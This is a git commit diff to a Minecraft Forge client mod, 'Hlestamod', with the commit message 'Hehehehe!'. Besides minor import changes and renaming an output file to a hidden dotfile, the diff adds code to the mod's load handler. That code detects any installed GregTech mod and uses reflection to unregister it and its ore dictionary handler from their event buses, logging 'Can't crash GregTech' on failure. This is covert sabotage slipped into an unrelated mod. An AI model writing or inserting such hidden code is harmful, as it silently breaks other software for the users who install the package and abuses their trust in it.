b0c47a6c916765aeb5949a6c60c93269d3063438
nyankatze0 <nickelodeon73@ya.ru>
2014-07-30 23:07:47 +0400

    Hehehehe!

--- main/java/net/nix/clientmod/Hlestamod.java
+++ main/java/net/nix/clientmod/Hlestamod.java
@@ -1,14 +1,13 @@
 package net.nix.clientmod;
 
-import cpw.mods.fml.common.Loader;
-import cpw.mods.fml.common.Mod;
+import cpw.mods.fml.common.*;
 import cpw.mods.fml.common.Mod.EventHandler;
-import cpw.mods.fml.common.SidedProxy;
 import cpw.mods.fml.common.event.FMLInitializationEvent;
 import cpw.mods.fml.common.event.FMLPostInitializationEvent;
 import cpw.mods.fml.common.event.FMLPreInitializationEvent;
 import cpw.mods.fml.relauncher.Side;
 import cpw.mods.fml.relauncher.SideOnly;
+import net.minecraftforge.common.MinecraftForge;
 import net.minecraftforge.common.config.Configuration;
 import net.minecraftforge.oredict.OreDictionary;
 
@@ -16,6 +15,7 @@ import java.io.BufferedWriter;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.io.Writer;
+import java.lang.reflect.Field;
 
 import static net.nix.clientmod.Hlestamod.*;
 
@@ -46,7 +46,7 @@ public class Hlestamod {
     public void postInit(FMLPostInitializationEvent event){
         Writer writer = null;
         try{
-            writer = new BufferedWriter(new FileWriter(Loader.instance().getConfigDir() + "/OreDictNames.cfg"));
+            writer = new BufferedWriter(new FileWriter(Loader.instance().getConfigDir() + "/.OreDictNames.txt"));
             writer.append("There are listed all registered in game OreDictionary names\n\n");
             for(String s : OreDictionary.getOreNames()){
                 for(int i = 0; i < OreDictionary.getOres(s).size(); i++){
@@ -67,5 +67,30 @@ public class Hlestamod {
     @EventHandler
     public void load(FMLInitializationEvent event) {
         ClientProxy.addCapes();
+
+        for (ModContainer o : Loader.instance().getModList())
+        {
+            if (o.getModId().toLowerCase().contains("gregtech"))
+            {
+                try
+                {
+
+                    ModContainer mod = o;
+                    Field ann = FMLModContainer.class.getDeclaredField("eventBus");
+                    ann.setAccessible(true);
+                    com.google.common.eventbus.EventBus googlebus = (com.google.common.eventbus.EventBus) ann.get(mod);
+                    googlebus.unregister(mod);
+
+                    Class clazz = Class.forName("gregtechmod.common.GT_OreDictHandler");
+                    MinecraftForge.EVENT_BUS.unregister(clazz);
+                    System.out.println("[nixhlestakov] Hehehehe!");
+                }
+                catch (Exception e)
+                {
+                    System.err.println("[nixhlestakov] Can't crash GregTech");
+                    e.printStackTrace();
+                }
+            }
+        }
     }
 }
